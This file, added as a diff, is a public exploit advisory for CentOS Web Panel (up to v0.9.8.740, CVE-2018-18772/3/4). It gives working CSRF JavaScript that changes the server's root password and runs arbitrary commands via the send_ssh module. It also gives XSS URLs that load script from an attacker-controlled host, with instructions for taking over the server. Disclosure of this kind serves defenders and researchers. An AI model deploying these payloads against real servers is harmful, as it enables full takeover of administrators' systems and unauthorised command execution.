@@ -1,0 +1,58 @@
+# Title: CentOS Web Panel Root Account Takeover + Remote Command Execution <= v0.9.8.740
+# Author: InfinitumIT (https://infinitumit.com.tr)
+# Vendor Homepage: centos-webpanel.com
+# Software Link: http://centos-webpanel.com/cwp-latest
+# Version: Up to v0.9.8.740.
+# CVE: CVE-2018-18773, CVE-2018-18772 and CVE-2018-18774.
+#? Detailed: https://numanozdemir.com/respdisc/cwp.pdf
+
+# Description:
+# Attacker can change target server's root password and execute command, by CSRF vulnerability.
+# Also, there is a XSS vulnerability, hacker can exploit the CSRF vulnerability by this XSS
+# vulnerability and run bad-purposed JavaScript codes on administrator's browser.
+# So, CSRF/XSS to full server takeover.
+
+# How to Reproduce:
+# Hacker can exploit this vulnerability (changing root password) by XSS or CSRF.
+# Hacker will create a website and put those codes into source:
+
+<script>
+var url = "http://targetserver:2030/admin/index.php?module=rootpwd";
+var params = "ifpost=yes&password1=newpassword&password2=newpassword";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+vuln.send(params);
+</script>
+
+# (Update newpassword as the password that you want to change.)
+
+# If hacker wants to exploit this by CSRF, CWP administrator will click hacker's website.
+# But if hacker wants to exploit this by XSS, CWP administrator will click here: (admin's own website)
+# http://targetserver:2030/admin/index.php?module=<script%20src=//hackerswebsite.com/password.js></script>
+# After exploiting, you can connect to server by Putty or access the CWP panel with the password
+# that you have specified from 2030 port.
+
+# The second vulnerability is remote command execution.
+# Hacker can exploit this vulnerability (remote command execution) by XSS or CSRF too.
+# Again, hacker will create a website and put those codes into source:
+
+<script>
+var url = "http://targetserver:2030/admin/index.php?module=send_ssh";
+var params = "ssh+command=whoami";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+vuln.send(params);
+</script>
+
+# (Update whoami as command that you want to run.)
+
+# Same logic like top, if hacker wants to exploit this by CSRF, CWP administrator will click hacker's website.
+# But if hacker wants to exploit this by XSS, CWP administrator will click here: (admin's own website)
+# http://targetserver:2030/admin/index.php?module=<script%20src=//hackerswebsite.com/command.js></script>
+
+# shouldnt think that CSRF/XSS are unimportant vulnerabilities.
+# for secure days...
